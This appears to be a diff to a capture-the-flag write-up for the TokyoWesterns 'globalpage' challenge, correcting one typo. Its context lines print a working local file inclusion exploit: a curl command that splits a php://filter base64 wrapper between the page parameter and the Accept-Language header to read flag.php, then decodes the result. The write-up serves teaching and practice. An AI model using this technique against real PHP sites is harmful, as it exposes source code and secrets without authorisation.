@@ -81,7 +81,7 @@ else {
 _include "flag.php"_, so one more time LFI:
 `pirate$ curl 'http://globalpage.chal.ctf.westerns.tokyo/?page=php:' -H "Accept-Language:/filter/convert.base64-encode/resource=flag"` => result in the GET Request `http://globalpage.chal.ctf.westerns.tokyo/?page=php://filter/convert.base64-encode/resource=flag.php`.
 
-Decode base64 et woitlà:
+Decode base64 et voitlà:
 
 ```
 pirate$ echo "PD9waHAKJGZsYWcgPSAiVFdDVEZ7SV9mb3VuZF9zaW1wbGVfTEZJfSI7Cg" | base64 -D -
